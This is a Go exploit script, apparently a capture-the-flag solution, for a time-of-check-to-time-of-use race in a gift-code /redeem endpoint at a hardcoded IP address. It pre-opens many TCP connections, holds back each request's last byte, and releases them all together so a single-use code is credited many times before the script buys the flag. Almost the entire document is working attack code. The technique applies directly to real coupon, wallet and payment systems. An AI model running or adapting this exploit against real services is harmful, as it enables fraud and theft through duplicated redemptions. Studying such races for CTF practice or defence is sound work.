// 34-logic-race-condition  TOCTOU 竞态利用 (Go 版)
//
// 漏洞：/redeem 的 read -> check used -> sleep(0.15) -> read -> +10 -> write 非原子。
// 打法：预建 N 条 TCP 连接，把请求除最后 1 字节外先发出去（Content-Length 已声明，
//
//	服务端会等齐才进 handler），再用 close(start) 让所有连接同一瞬间补发最后 1 字节，
//	N 个请求几乎同时越过 used 检查 -> GIFT10 被并发累加到 >=100 -> /buy 换 flag。
//
// 用法： go run main.go [N]      # N 默认 50，可命令行覆盖
package main

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	base = "http://47.120.76.57:35023"
	host = mustHost(base)
	code = "GIFT10"
	N    = 50
)

func mustHost(b string) string {
	u, err := url.Parse(b)
	if err != nil {
		panic(err)
	}
	return u.Host
}

var balRe = regexp.MustCompile(`¥<b>(\d+)</b>`)

func getBalance() int {
	resp, err := http.Get(base + "/")
	if err != nil {
		return -1
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	m := balRe.FindSubmatch(b)
	if m == nil {
		return -1
	}
	n, _ := strconv.Atoi(string(m[1]))
	return n
}

func reset() {
	// 不跟随 302，避免 keep-alive 复用旧连接
	client := &http.Client{
		Timeout:       10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
	if resp, err := client.Get(base + "/reset"); err == nil {
		resp.Body.Close()
	}
}

func buy() string {
	resp, err := http.Post(base+"/buy", "application/x-www-form-urlencoded", nil)
	if err != nil {
		return "ERR:" + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return string(b)
}

// race 预建 n 条连接并用 last-byte 同步触发并发 /redeem
func race(n int) {
	body := "code=" + code
	req := "POST /redeem HTTP/1.1\r\n" +
		"Host: " + host + "\r\n" +
		"User-Agent: go-race\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: " + strconv.Itoa(len(body)) + "\r\n" +
		"Connection: close\r\n\r\n" + body
	head := req[:len(req)-1] // 除最后 1 字节外，全部预发
	tail := req[len(req)-1:] // 最后 1 字节，对齐后同时补发

	results := make([]string, n)
	var wgReady, wgDone sync.WaitGroup
	start := make(chan struct{})

	for i := 0; i < n; i++ {
		wgReady.Add(1)
		wgDone.Add(1)
		go func(i int) {
			defer wgDone.Done()
			c, err := net.DialTimeout("tcp", host, 5*time.Second)
			if err != nil {
				results[i] = "ERR:dial"
				wgReady.Done()
				return
			}
			defer c.Close()
			c.SetDeadline(time.Now().Add(20 * time.Second))
			if _, err := c.Write([]byte(head)); err != nil {
				results[i] = "ERR:head"
				wgReady.Done()
				return
			}
			wgReady.Done() // head 已落地，报告就绪
			<-start        // 卡在这里等总指挥
			if _, err := c.Write([]byte(tail)); err != nil {
				results[i] = "ERR:tail"
				return
			}
			data, _ := io.ReadAll(c)
			results[i] = string(data)
		}(i)
	}

	wgReady.Wait() // 所有 head 都到服务端了
	t0 := time.Now()
	close(start) // 同时补发最后 1 字节
	wgDone.Wait()

	ok := 0
	tally := map[string]int{}
	for _, r := range results {
		switch {
		case strings.Contains(strings.ReplaceAll(r, " ", ""), `"ok":true`):
			ok++
			tally["ok"]++
		case strings.Contains(strings.ReplaceAll(r, " ", ""), `"ok":false`):
			tally["already_used"]++
		case strings.HasPrefix(r, "ERR:"):
			tally[r]++
		case r == "":
			tally["empty/reset"]++ // 服务端没回响应就断了（容器抽风）
		case strings.Contains(r, "500"):
			tally["500"]++
		default:
			tally["other"]++
		}
	}
	fmt.Printf("[*] race N=%d elapsed=%.2fs ok=%d/%d  %v\n",
		n, time.Since(t0).Seconds(), ok, n, tally)
}

func main() {
	defer fmt.Println("作者 ZluxYao")
	base = strings.TrimRight(base, "/") // 容忍末尾斜杠，避免拼成 //reset
	if len(os.Args) > 1 {
		if v, err := strconv.Atoi(os.Args[1]); err == nil && v > 0 {
			N = v
		}
	}

	// reset 会把余额清零，跨轮无法累加：每次尝试都必须 reset 后在“一轮 burst”里抢够 >=100。
	// 不够就重新 reset 再抢一轮（独立尝试），最多 maxAttempts 次。
	const maxAttempts = 8
	bal := 0
	for attempt := 1; attempt <= maxAttempts; attempt++ {
		fmt.Printf("\n=== attempt %d/%d  (reset -> race N=%d) ===\n", attempt, maxAttempts, N)
		reset()
		time.Sleep(600 * time.Millisecond)
		if b := getBalance(); b < 0 {
			fmt.Println("[x] server unreachable (balance=-1), abort")
			fmt.Println("作者 ZluxYao")
			os.Exit(1)
		}
		race(N)
		time.Sleep(600 * time.Millisecond)
		bal = getBalance()
		fmt.Printf("[*] balance = %d\n", bal)
		if bal >= 100 {
			break
		}
		fmt.Println("[!] <100：used 已被占用，本轮作废，重新 reset 再抢")
	}

	if bal < 100 {
		fmt.Printf("[x] %d 轮都没抢够 100（最后 %d）。加大并发再试：go run main.go %d\n",
			maxAttempts, bal, N*2)
		fmt.Println("作者 ZluxYao")
		os.Exit(1)
	}

	fmt.Println("[*] /buy ->")
	resp := buy()
	fmt.Println(resp)
	if m := regexp.MustCompile(`TOGOGO-flag\{[^}]+\}|flag\{[^}]+\}`).FindString(resp); m != "" {
		fmt.Printf("\n[+] FLAG = %s\n", m)
	} else {
		fmt.Println("[!] flag not found in response")
	}
}
